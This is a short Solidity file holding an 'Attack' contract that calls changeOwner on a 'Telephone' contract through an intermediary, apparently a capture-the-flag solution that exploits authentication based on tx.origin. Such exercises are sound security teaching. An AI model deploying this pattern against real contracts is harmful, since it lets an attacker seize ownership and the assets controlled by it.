// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract Attack{
  function attack(address _telephoneAddr) public {
    ITelephone(_telephoneAddr).changeOwner(msg.sender);
  }
}
